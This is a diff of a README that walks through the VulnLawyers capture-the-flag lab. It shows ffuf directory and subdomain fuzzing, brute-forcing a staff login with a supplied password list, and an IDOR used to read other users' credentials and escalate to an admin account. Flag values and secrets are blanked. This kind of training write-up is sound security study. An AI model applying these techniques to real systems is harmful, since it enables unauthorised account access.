@@ -2,27 +2,31 @@ VulnLawyers - CTF Walkthrough
 
 📁 Repository Overview
 
-This repository contains a full walkthrough of the VulnLawyers CTF, solved using only:
+  This repository contains a full walkthrough of the VulnLawyers CTF, solved using only:
 
-ffuf (directory and subdomain fuzzing)
+    ffuf (directory and subdomain fuzzing)
 
-Caido (web proxy analysis)
+    Caido (web proxy analysis)
 
-The methodology follows a clean, repeatable pentest format with all flags captured and documented.
+  The methodology follows a clean, repeatable pentest format with all flags captured and documented.
 
-All screenshots and proof-of-work are stored in the /screenshots directory.
+  All screenshots and proof-of-work are stored in the _/screenshots_ directory.
 
 🔧 Tools Used
 
-ffuf – Fast web fuzzer
+  ffuf – Fast web fuzzer
 
-Caido – Web proxy for intercepting and manipulating requests
+  Caido – Web proxy for intercepting and manipulating requests
 
-Linux shell (Parrot OS)
+  Linux shell (Parrot OS)
+
+🔍 Scope
+
+    https://sufrin.ctfi/
 
 🧠 Objective
 
-Gain access to the VulnLawyers web server, enumerate for vulnerabilities, escalate privileges, and capture all flags.
+  Gain access to the VulnLawyers web server, enumerate for vulnerabilities, escalate privileges, and capture all flags.
 
 🛰️ 1. Recon
 
@@ -30,7 +34,7 @@ Gain access to the VulnLawyers web server, enumerate for vulnerabilities, escala
 
 📂 2. Directory Fuzzing with ffuf (Main Domain)
 
-ffuf -w subdomains.txt -u https://[target-ip]/FUZZ
+  _ffuf -w subdomains.txt -u https://sufrin.ctfi/FUZZ_
 
   Key results:
 
@@ -40,7 +44,7 @@ ffuf -w subdomains.txt -u https://[target-ip]/FUZZ
 
 🌐 3. Subdomain Discovery with ffuf (Main Domain)
 
-ffuf -w subdomains.txt -u https://[target-ip]/ -H "Host: FUZZ.[target-ip]"
+  _ffuf -w subdomains.txt -u https://sufrin.ctfi/ -H "Host: FUZZ.sufrin.ctfi"_
 
   Key result:
 
@@ -48,7 +52,7 @@ ffuf -w subdomains.txt -u https://[target-ip]/ -H "Host: FUZZ.[target-ip]"
 
 📂 4. Directory Fuzzing with ffuf (Subdomain: data)
 
-ffuf -w subdomains.txt -u https://data.[target-ip]/FUZZ
+  _ffuf -w subdomains.txt -u https://data.sufrin.ctfi/FUZZ_
 
   Key result:
 
@@ -56,11 +60,11 @@ ffuf -w subdomains.txt -u https://data.[target-ip]/FUZZ
 
 🔐 5. Intercept & Analyze with Caido
 
-Interecepted GET /users
+  Interecepted GET _/users_
 
   Key finding:
 
-{
+    {
     "users": [{
         "name": "Yusef Mcclain",
         "email": "________________"
@@ -78,85 +82,85 @@ Interecepted GET /users
         "email": "_________________________"
     }],
     "flag": "[________________________________]"
-}
+    }
 
-Intercepted GET /login 
+  Intercepted GET _/login_
 
   Key finding:
 
     /lawyers-only
 
-Intercepted POST /lawyers-only (login attempt)
+  Intercepted POST _/lawyers-only_ (login attempt)
 
-  Key findings:
+  Key findings (Structure):
 
-    email=___&password=___
+    email=admin&password=admin
 
 🛠️ 6. Login Access with Caido
 
-Automated Matrix Payloads with Caido
+  Automated Matrix Payloads with Caido
 
-  Used usernames found in /users domain and passwords.txt file provided by HackingHub
+  Used usernames found in _/users_ domain and _passwords.txt_ file provided by HackingHub
 
-Gained credentials and access to /lawyers-only-profile
+  Gained credentials and access to _/lawyers-only-profile_
 
 🔐 7. Intercept & Analyze with Caido
 
-Intercepted GET /lawyers-only-profile-details/4 (attempted change of credentials)
+Intercepted GET _/lawyers-only-profile-details/4_ (attempted change of credentials)
 
   Key findings: 
 
-Insecure Direct Object Reference (IDOR)
+  Insecure Direct Object Reference (IDOR)
 
-{
+    {
     "id": 4,
     "name": "___________",
     "email": "_____________________",
     "password": "_____________"
-}
+    }
 
 🧍 8. Privilege Escalation 
 
-Replayed request with Caido
+  Replayed request with Caido
 
-GET /lawyers-only-profile-details/2
+  GET _/lawyers-only-profile-details/2_
 
   Key findings:
 
-User that happens to be the case manager
+  User that happens to be the case manager
 
-{
+    {
     "id": 2,
     "name": "Shayne Cairns",
     "email": "_______________",
     "password": "______________",
     "flag": "[____________________]"
-}
+    }
 
-Gained access as Shayne Cairns (Case Manger - Admin)
+  Gained access as Shayne Cairns (Case Manger - Admin)
 
 🏁 7. Flags Captured
 
 Flag # 1
 
-  Path: https://[target-ip]/users
+  Path: _https://sufrin.ctfi/users_
 
 Flag # 2
 
-  Caido Intercept: GET /login
+  Caido Intercept: GET _/login_
 
 Flag # 3
 
-  Caido Intercept: GET /users
+  Caido Intercept: GET _/users_
 
 Flag # 4
 
-  Staff Portal: https://[target-ip]/lawyers-only
+  Staff Portal: _https://sufrin.ctfi/lawyers-only_
 
 Flag # 5
 
-  Caido Request Replay: GET /lawyers-only-profile-details/2
-
+  Caido Request Replay: GET _/lawyers-only-profile-details/2_
+  
 Flag # 6
 
   Staff Portal as Shayne Cairns and deleted current case.
